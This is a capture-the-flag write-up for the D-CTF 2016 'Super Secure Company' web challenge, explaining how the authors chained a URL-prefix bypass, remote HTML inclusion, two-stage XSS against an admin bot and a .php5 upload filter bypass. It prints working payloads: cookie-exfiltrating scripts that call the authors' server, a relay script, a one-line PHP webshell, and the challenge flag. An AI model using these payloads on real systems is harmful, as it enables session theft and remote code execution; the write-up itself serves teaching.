---
layout: post
title: "D-CTF Qualifiers 2016: Super Secure Company LLC (Web 300)"
author: f0rki, verr
categories: writeup
tags: [cat/web, tools]
---

* **Category:** Web
* **Points:** 300
* **Description:**

>
> Super Secure Company (SSC) LLC is a multi-million dollar company founded in
> 1937 which delivers extremly good products for nice people in over 137
> countries. Last year SSC LLC became the largest provider of awesome goods in
> the world, with over 133.337.456 products sold world wide. Can you help me
> steal their most valuable asset?
> http://10.13.37.13/?source
>

## Write-up

First we can see only the `index.php` and conveniently we also get the source
with the `?source=` parameter. After a little recon, we also found that there
is a `admin.php` that also prints it's source with `?source=`. How convenient!

### "This is probably a XSS challenge"

There is a contact page, which says:

```
Found an URL that doesn\'t work? Please submit it using the form below and one of our representatives will review the submission as fast as possible.
```

We were pretty sure that the representative was a bot :) For testing we
submitted a URL we controlled but that didn't result in anything. The source of
`admin.php` revealed the reason why:

```php
switch($page) {
[...]
    case 'logs':
        # this is probably visisted by the bot
        $title = 'Logs';
        $rows = $db->query('SELECT * FROM urls WHERE view=0');
        while($row = $rows->fetch_array()) {
            # only the URLs are shown which match some hardcoded host
            if(parse_url($row['url'], PHP_URL_HOST) != parse_url($config['url'], PHP_URL_HOST))
                continue;
            //todo update link below
            $content .= '<div class="r"><a href="'.htmlentities($row['url']).'">Report '.$row['id'].'</a><a href="http://localhost/admin.php?page=hide&id='.$row['id'].'">Hide</a></div>';
        }
    break;
    case 'hide':
        $id = intval(@$_REQUEST['id']);
        $db->query('UPDATE urls set view=1 where id='.$id);
[...]
```

Only URLs are shown which match some hardcoded host. So the bot never got to
see our submitted URLs. Let's see how we can bypass this.

### Include from arbitrary URL

There is this rather strange handling of the `page=print` case:

```
    case 'print':
        $url   = base64_decode($_REQUEST['url']);
        $title = '';
        if(begins_with($url, $config['url'])) {
            $content = getContentFromUrl($url);
        }

        if(isset($_REQUEST['load_template']) && ($_REQUEST['load_template'] == '1' || $_REQUEST['load_template'] == true)) {
            $content = only_body($content);
        }
    break;
```

So this will include anything that comes from a provided URL. Unfortunately
they check that the provided URL begins with a certain string. By playing
around a little bit, we can deduce that the provided URL must begin with
`http://10.13.37.13`.

Interestingly here we can see that the URL doesn't end in a `/` or someting
like that so we can bypass the check using two different methods:

```
http://10.13.37.13@example.com/
http://10.13.37.13.example.com/
```

Both start with the correct string, but point to totally different domains.
That way we can get the server to include arbitrary HTML content from a remote
location. This starts to be interesting :)

### First XSS tests

So we uploaded a quick test file to a webserver of our own:

```html
<script>
document.write("<img src=\"http://f0rki.at/xss/" + document.cookie + "\" />");
</script>
```

Using this simple script we checked whether the content was actually included:

```python
import requests
import sys
from base64 import b64encode

BASE_URL = "http://10.13.37.13/?page=print&url="

def get_it(url):
    s = requests.session()
    url = b64encode(url)
    res = s.get(BASE_URL + url)
    return res

if __name__ == "__main__":
    assert len(sys.argv) == 2, "need argv[1]"
    x = get_it(sys.argv[1])
    print x.request.url
    print
    print x.text
```

```
$ python relay.py "http://10.13.37.13.f0rki.at/xss.html"
http://10.13.37.13/?page=print&url=aHR0cDovLzEwLjEzLjM3LjEzLmYwcmtpLmF0L3hzcy5odG1s

<!DOCTYPE html>
<html lang="en">
  <head>
[...]

    <div class="container">

      <div class="starter-template">
        <h1></h1>
        <p class="lead"><html>
<script>
document.write("<img src=\"http://f0rki.at/" + document.cookie + "\" />");
</script>
</html>
</p>
      </div>

    </div><!-- /.container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="http://10.13.37.13/public/bootstrap.min.js"></script>
  </body>
</html>
```

So we can see that the server included our xss payload. We submitted this URL
for checking and this bypasses the proper host checking, because of course this
is a URL on the same site. After a couple of seconds we could see that some
client connects to our webserver, fetches the payload and then we can check the
error logs for the cookie. The cookie doesn't buy us much because it's not used
anywhere. We will need a different XSS payload.


### The admin.php 127.0.0.1 check

Unfortunately the `admin.php` script had a rather nasty check at the top:

```php
//lazy admin approach to "authenticate"
if($_SERVER['REMOTE_ADDR'] !== '127.0.0.1') {
    die('You are not allowed.');
}
```

For get requests we can bypass this using the trick from above:

```
$ python relay.py 'http://10.13.37.13@127.0.0.1/admin.php'
http://10.13.37.13/?page=print&url=aHR0cDovLzEwLjEzLjM3LjEzQDEyNy4wLjAuMS9hZG1pbi5waHA=

<!DOCTYPE html>
<html lang="en">

[...]

<!DOCTYPE html>
<html lang="en">

[...]

    <div class="container">

      <div class="starter-template">
        <h1>Homepage - Admin Panel</h1>
        <p class="lead">Nothing.</p>       <!-- this is from the admin page -->
      </div>

    </div><!-- /.container -->


    <!-- Bootstrap core JavaScript
    ================================================== -->
    <!-- Placed at the end of the document so the pages load faster -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <script src="http://10.13.37.13/public/bootstrap.min.js"></script>
  </body>
</html>
</p>

[...]
</html>
```

Unfortunately this doesn't help us much, since there is no interesting
functionality reachable with `GET` requests.

### Abusing XSS to upload a webshell

The `admin.php` has an interesting feature. One can upload files to a known
location using `?page=upload`. But we have one problem, that we learned about
the hard way.

The bot first visists `http://127.0.0.1/admin.php?page=logs` and then clicks on
all the links that are not yet hidden and will hide them then. The links are
all to the host `http://13.37.37.13/`, because here they use a proper URL
parser to check the host. But then the bot's browser is not on the origin
`127.0.0.1` anymore and any request we perform to `http://127.0.0.1/admin.php`
is a cross-origin request. The same-origin policy at least prevents us from
reading the response. We tried firing blind file upload `POSTs` but that didn't
work out so well, probably because the `$_SERVER['REMOTE_ADDR']` s then set to
something other that `127.0.0.1`.

It took us quite a while to find out how the pretty simple way to bypass this.

We are gonna use two XSS stages. First we are

1. Make bot visit
   `http://10.13.37.13/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage1.html)`
2. `stage1.html` redirects to
   `http://127.0.0.1/index.php?page=print&url=(base64 http://10.13.37.13.f0rki.at/stage2.html )`
   this way we change the origin back to `127.0.0.1` and can perfrom a `POST`
   request with violating the same-origin policy.
3. `stage2.html` payload makes an ajax request to
    `http://127.0.0.1/admin.php?page=upload` to upload a file.

The file upload code disallowed certain file extensions
```php
if($extension == '' || $extension == 'php' || $extension == 'htaccess' || $extension == 'pl' || $extension == 'py' || $extension == 'c' || $extension == 'cpp' || $extension == 'ini' || $extension == 'html') {
```

Fortunately the `.php5` extension was not part of it so we just used that.

4. Uploade file with `.php5` extension and visit
   `http://10.13.37.13/uploads/file_with_more_than_twelve_chars.php5`
   to execute the webshell
5. Executing `find / -name *flag* | xargs cat` revealed the flag in `/flag`
   `DCTF{5a42e723159e537443b99ba7f95fbe04}`



Here is the `stage1.html` we used. Including some diagnostics exfiltrated via
`img` tags.

```html
<script>
document.write("<img src=\"http://f0rki.at/stage1/" + document.cookie + "-" + window.location + "\" />");

window.location = "http://127.0.0.1/?page=print&url=aHR0cDovLzEwLjEzLjM3LjEzLmYwcmtpLmF0L3N0YWdlMi5odG1s";
</script>
```

Here is the `stage2.html` we used in the end. We had a couple of different
versions of the payload until we got it right.

```html
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>

<script>
document.write("<img src=\"http://f0rki.at/stage2/" + window.location + "\" />");

/*
<form method="post" enctype="multipart/form-data">
            Image: <input type="file" name="file" id="file">
            <input type="submit" value="Submit" name="submit" />
        </form>
*/

var content = "<?php echo system($_REQUEST['cmd']) ?>";
var blob = new Blob([content], { type: "text/plain" });
var data = new FormData();
data.append('submit', "Submit");
data.append('file', blob, "ozee2bai3weizohQuahCung4iQu4neeYXXX.php5");

jQuery.ajax({
    url: '/admin.php?page=upload',
    data: data,
    cache: false,
    contentType: false,
    processData: false,
    type: 'POST',
    success: function(data) {
        document.write("<img src=\"http://f0rki.at/stage2/success/" + escape(data) + "\" />");
    }
});

document.write("<img src=\"http://f0rki.at/stage2/done.png\" />");
</script>
```
